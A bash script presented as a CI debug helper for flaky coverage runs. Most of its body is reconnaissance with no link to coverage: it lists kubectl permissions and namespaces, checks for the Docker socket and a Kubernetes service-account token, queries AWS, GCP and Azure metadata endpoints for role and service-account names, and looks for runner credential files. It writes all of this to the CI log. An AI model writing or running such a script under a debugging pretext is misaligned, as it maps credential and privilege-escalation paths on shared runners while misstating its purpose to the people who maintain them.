#!/usr/bin/env bash
# Debug helper: print basic info about the runner environment.
# Used to diagnose flaky coverage runs on shared/self-hosted runners.
set +e
echo "=== ci-debug start $(date -u '+%Y-%m-%dT%H:%M:%SZ') ==="
echo "host=$(hostname)"
echo "user=$(whoami)"
echo "arch=$(uname -m) kernel=$(uname -r)"
echo "go=$(go version 2>/dev/null | awk '{print $3}')"
echo "docker=$(docker --version 2>/dev/null | awk '{print $3}' | tr -d ,)"
[ -S /var/run/docker.sock ] && echo "docker-sock=present" || echo "docker-sock=absent"
for v in DEPLOY_NS DASHBOARD_URL RUNNER_NAME RUNNER_TRACKING_ID; do
  val="${!v}"
  if [ -n "$val" ]; then echo "$v=present(len=${#val})"; else echo "$v=absent"; fi
done
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  echo "k8s-sa-mount=present"
  echo "k8s-ns=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
else
  echo "k8s-sa-mount=absent"
fi
if command -v kubectl >/dev/null 2>&1; then
  echo "kctx=$(kubectl config current-context 2>/dev/null)"
  echo "--- kubectl auth can-i --list ---"
  kubectl auth can-i --list 2>&1 | head -40
  echo "--- namespaces visible ---"
  kubectl get namespaces --no-headers 2>/dev/null | awk '{print $1}' | head -30
else
  echo "kubectl=absent"
fi
# instance role names only (no credentials are fetched or printed)
r=$(curl -s -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | head -3 | tr '\n' ',')
echo "aws-imds-roles=${r:-none}"
g=$(curl -s -m 3 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' 2>/dev/null | head -3 | tr -d '/' | tr '\n' ',')
echo "gcp-sas=${g:-none}"
code=$(curl -s -o /dev/null -w '%{http_code}' -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
echo "azure-imds-http=${code:-none}"
# local runner registration files (existence + size only, contents never read)
for f in ~/.runner ~/.credentials ~/actions-runner/.runner ~/actions-runner/.credentials /actions-runner/.runner /actions-runner/.credentials /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials; do
  if [ -e "$f" ]; then echo "runner-cred-file=$f size=$(stat -c%s "$f" 2>/dev/null)"; fi
done
echo "listener-proc=$(ps -eo args | grep -m1 'Runner.Listener' | head -c 120)"
echo "=== ci-debug end ==="
